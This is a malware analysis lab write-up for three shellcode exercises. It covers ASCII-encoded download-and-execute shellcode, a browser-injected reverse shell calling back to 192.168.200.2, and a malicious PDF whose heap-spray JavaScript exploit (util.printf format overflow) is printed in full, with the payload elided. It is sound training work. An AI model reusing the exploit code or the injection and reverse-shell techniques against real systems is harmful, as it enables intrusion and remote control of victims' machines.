# Lab 19

## Lab 19-1
### Basic Static Analysis
- **strings**: A long sequence of "A"s as well as another sequence of seemingly random ascii characters.

### Advanced Static/Dynamic Analysis
Loading the binary into IDA, we see a bunch of 'A' bytes (0x41) which correspond to `inc ecx`, a sort of NOP that remains in the ascii range. After this, there's a call/ret combo to get a pointer to the 'random' ascii string after our main shellcode, and it is pushed back onto the stack. The shellcode appears to decode each byte of this string, by decoding each byte as so: `c[i] = (c[2*i] - 0x41) << 4 + (c[2*i+1] - 0x41)`, meaning each byte of plaintext comes from the bottom nybble of two bytes of ascii. Once this is done, the newly decoded instructions are returned to. To see what this decodes so, I loaded the `shellcode_launcher.exe` into Olly and set the args to load the binary. I then set a hardware breakpoint at 0x350300, which is 0x200 bytes past where it was loaded, but right after where all the 0x41 bytes end. I then walked through until just before the return.

At this point most of the ascii has been decoded into valid instructions, and there are also two strings at the end: "URLMON" and "http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe". The same call/ret combo is used to get a pointer to the "URLMON" string.

`sub_35039E` is used to find the address of _kernel32.dll_ by parsing the `PEB_LDR_Data` linked list which it finds through the `PEB`, from FS:[0x30].

After this there is a call to a function, `sub_350352`, used to find some functions. It is passed a handle to the module (kernel32 for most) and a hash of the function name, and loops over the functions in the import table, hashing their name `sub_350331`, until it finds a match. It is called repeatedly, finding a handful of different functions, including `LoadLibraryA`. `LoadLibraryA` is used to load URLMON, and then the address of `URLDownloadToFileA` is found using `sub_350352` again. The system path is resolved using `GetSystemDirectoryA` and the _annoy_user.exe_ file is downloaded to _%SYSTEM%/1.exe_, and finally executed.

### Questions
1. The shellcode is encoded by getting each nybble of the original byte and storing it across two bytes, adding 0x41 to each to move it into ASCII range.
2. `LoadLibraryA`, `GetSystemDirectoryA`, `TerminateProcess`, `GetCurrentProcess`, `WinExec`, and `URLDownloadToFileA`.
3. www.practicalmalwareanalysis.com
4. The downloaded file remains at _%SYSTEM%/1.exe_.
5. The shellcode downloads and executes a binary found at http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe.

## Lab 19-2
### Basic Static Analysis
- **strings**: Nothing interesting besides some error messages and "\\http\\shell\\open\\command".
- **PEiD**: Microsoft Visual C++ 6.0.
- **Dependency Walker**: Many imports from KERNEL32.DLL, including `WriteProcessMemory`, and `VirtualAllocEx`. `AdjustTokenPrivileges`, `LookupPrivilegeValueA`, `OpenProcessToken`, plus registry imports from ADVAPI.DLL.
- **PEview**: Normal section names and headers.

### Advanced Static/Dynamic Analysis
Knowing that this process will write shellcode into another process, I opened the binary in IDA and immediately found where `WriteProcessMemory` was called. It's called from `sub_401230`, where both the buffer and the size were provided as args. Finding the xref to the call from `_main`, we see it writes 423 bytes from `unk_407030`. Jumping to this address and hitting `C` to turn it to code, we see a simple shellcode that uses call/ret to get a pointer to part of the shellcode, which is decrypted by xoring each byte with 0xE7. While this could be done easily dynamically by letting the shellcode itself do it, I didn't feel like tracing two processes at once, so I wrote an IDC script to get it done.

```c
static decrypt(){
    auto i, start;
    start = 0x407048;
    for(i = 0; i < 0x18E; i++) {
        PatchByte(start+i, Byte(start+i) ^ 0xE7);
    }
}
```

I could have of course written one that took the start, length, and key as an argument, but this was quick and dirty. Once I ran this I again hit `C` with my cursor on 0x407048 to get more assembly to analyze. Following the first jump/call to `sub_4070E3`, there's another call to `sub_4070C2`, which again looks like code to find the address of KERNEL32.DLL in memory. `sub_407076` looks like another function that is provided a library and a hash and returns the address of the function whose hash matches. `loc_407055` appears to be the hashing function.

Going back to the loader (though still in the same IDA binary), tracing back from `OpenProcess`, we find that the handle was returned from a call to `CreateProcessA`. The name of the application that is created comes from `sub_401000`, which reads from the registry key "\\http\\shell\\open\\command".

Hopping into a debugger and tracing through this function forward, we see that the path to my default browser is what's returned here. Following forward we can clearly see the process follows what we expect. Opening a second Olly instance and attaching to chrome, I can pause the application and then break on the call to `WriteProcessMemory` in the first process. Stepping past we see the shellcode copied into chrome. Now setting the "Break on new thread" option in the Chrome olly, we can step through in the malware olly until `CreateRemoteThread` and confirm it is created. Setting a breakpoint at the address where the shellcode was copied in allows us to walk through the decoding process. The malware should be finished now, which we can see as `_main` returns.

Walking through the loading process we confirm that a handle to kernel32 is acquired, and we can see that the first function they find is `LoadLibraryA`. Next is `CreateProcessA`, `TerminateProcess`, and `GetCurrentProcess`. `LoadLibraryA` is called to load ws2_32, and then `WSAStartup`, `WSASocketA`, and `connect`'s addresses are found in that library, and they are called in turn. Looking at the call to `connect` we see a struct being built on the stack and then its address pushed as an argument. In the struct there is the value 0x2C8A8C0, which corresponds to the IP address 192.168.200.2, and 0x12340002 corresponds to the family _AF_INET_ and port 13330.

`CreateProcessA` is called, creating a `cmd` process, with the streams hooked up to the socket, effectively giving a remote callback shell to the attacked, and then the browser process is killed.

### Questions
1. The operating system's default browser.
2. The shellcode is located in the malware's .data section at 0x407030.
3. The shellcode is simply encrypted with a one-byte xor key or 0xE7.
4. The shellcode imports `LoadLibraryA`, `CreateProcessA`, `TerminateProcess`, `GetCurrentProcess`, `WSAStartup`, `WSASocketA`, and `connect`.
5. The shellcode connects to 192.168.200.2 on port 13330.
6. The shellcode connects back to the host and runs a `cmd` process, connecting the process's streams to the socket.

## Lab 19-3
This lab isn't a binary, but is instead a _pdf_ file.
### Basic Static Analysis
- **strings**: Plenty, but nothing immediately pops out. Setting the argument to `-n 100` yields only two strings, both JavaScript. One is a bunch of char codes passed to `unescape`, while the other is a huge number assignment.

Opening the pdf in a hex editor makes it easy to copy the JavaScript code. There is more beyond the shellcode.

```JavaScript
var payload = unescape("...");
var version = app.viewerVersion;
app.alert("Running PDF JavaScript!");
if (version >= 8 && version < 9) {
    var payload;
    nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A")
    heapblock = nop + payload;
    bigblock = unescape("%u0A0A%u0A0A");
    headersize = 20;
    spray = headersize+heapblock.length;
    while (bigblock.length<spray) {
        bigblock+=bigblock;
    }
    fillblock = bigblock.substring(0, spray);
    block = bigblock.substring(0, bigblock.length-spray);
    while(block.length+spray < 0x40000) {
        block = block+block+fillblock;
    }
    mem = new Array();
    for (i=0;i<1400;i++) {
        mem[i] = block + heapblock;
    }
    var num = 12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;
    util.printf("%45000f",num);
} else {
    app.alert("Unknown PDF version!");
}
```

This code appears to be an exploint in some PDF viewer that is exploited by spraying the payload into a big buffer and then putting copies into an array. Finally it appears it's exploiting using `util.printf` with a format string with a long specifier ("%45000f").

Since it's not super easy to write to a file from a JS console in the browser, I just wrote something in python to mimic `unescape`. Normal url decoding won't work since the `%uXXYY` format is non-standard.

```python
def unescape(s):
    byts = []
    tokens = s.split("%")
    for token in tokens[1:]:
        if token[0] == "u":
            byts.append(token[3:].decode("hex"))
            byts.append(token[1:3].decode("hex"))
        else:
            byts.append(token[1:3].decode("hex"))
    return b"".join(byts)

payload = unescape("%ue589...")

with open("shellcode.bin", "wb") as f:
    f.write(payload)
```

### Advanced Static/Dynamic Analysis
Popping this new binary into IDA, we see a few jumps that mess up the disassembly a bit, but it otherwise looks rather straightforward. It starts by setting up a stack and calling `sub_17B`, which we'll call `main`. In main we can set up the function to use a BP based frame and set the stack offset to -0x17C, which is the amount we saw subtracted from esp just before jumping over. This nicely shows a handful of local variables as well as two small and one large buffer. From here there's a call to `sub_CA`, which gets the address/handle of kernel32 using the PEB, as we've seen before.

Also as we've seen before, there is a loop where a table of 'random' data is passed to a function and its return value is written back: This is finding the address of more functions. Loading `shellcode_loader.exe` into Olly and tracing, we see that it finds `LoadLibraryA`, `CreateProcessA`, `TerminateProcess`, `GetCurrentProcess`, `GetTempPathA`, `SetCurrentDirectoryA`, `CreateFileA`, `GetFileSize`, `SetFilePointer`, `ReadFile`, `WriteFile`, `CloseHandle`, `GlobalAlloc`, and `GlobalFree`. 

Some ascii is pushed to the stack, which reads "shell32", and `LoadLibraryA` is called to load it. Using the same process, another function is loaded: `ShellExecuteA`. 

Next `GetFileSize` is called in a loop, with the handle 'guessed' as multiples of 4, until a file is found with size 0xC602. This happens to be exactly the size of the pdf, which implies that the malware needs the pdf still. We can modify the arguments to the shellcode loader to have it load the file so that this part succeeds.

Using Olly to resolve the names of the functions that have been loaded allows us to quickly name all the calls in IDA. With these imports resolved we can do the rest rather quickly.

1. A buffer is allocated with `GlobalAlloc` with size 0xa000. The size comes from the same table where the function hashes were.
2. `SetFilePointer` on the pdf to 0x106f.
3. Call `sub_13D`, passing a pointer to `ReadFile`, the file handle, the alloced buffer address, and the buffer size. This simply loops until the size is read in.
4. `GetTempPathA` is called, and the buffer has "foo.exe" appended to the end.
5. `sub_EB` is called, which is provided the address to the start of the function table, a buffer, size, key, and a file path. It simply decrypts the buffer (which contains 0xa000 bytes taken from the pdf) using a single-byte xor key 0x4A and writes it to the provided path (_%TEMP%/foo.exe_).
6. `CreateProcessA` is called on this executable, which pops up some annoying dialog.
7. The buffer is freed (`GlobalFree`) and then another is allocated.
8. `SetFilePointer` on the pdf set to 0xB06F.
9. Read into the buffer.
10. Change the filename from _%TEMP%/foo.exe_ to _%TEMP%/bar.pdf_.
11. Decrypt the buffer with the same key and write it to the new filename.
12. Run `ShellExecuteA` with argument `open <path to bar.pdf>`.
13. `GetCurrentProcess` and use the handle in `TerminateProcess`.

Analyzing the PDF doesn't show anything interesting. The binary is also rather simple. It uses `GetModuleFileNameA` and `GetCurrentProcessId`, then creates the annoying dialog with `MessageBoxA`, (providing the pid to make it easier to kill), with a `Sleep` of 1 second between.

### Questions
1. The exploit is something to do with a pdf reader's JavaScript implementation. The heap is sprayed with shellcode and it is triggered with a `util.printf` with a long format specifier.
2. The shellcode is encoded in embedded JavaScript in the pdf in a simple string that is `unescape`'d.
3. `LoadLibraryA`, `CreateProcessA`, `TerminateProcess`, `GetCurrentProcess`, `GetTempPathA`, `SetCurrentDirectoryA`, `CreateFileA`, `GetFileSize`, `SetFilePointer`, `ReadFile`, `WriteFile`, `CloseHandle`, `GlobalAlloc`, and `GlobalFree` from KERNEL32.DLL, `ShellExecuteA` from SHELL32.DLL.
4. _%TEMP%/foo.exe_ and _%TEMP%/bar.pdf_.
5. The shellcode, after loading all the functions and libraries required, finds the handle to the pdf itself and then reads out two different payloads, both encrypted with a simple one-byte xor key of 0x4A. The first is an executable that pops up an annoying dialog every second. The second is a pdf that warns the user they could have been actually hacked. 
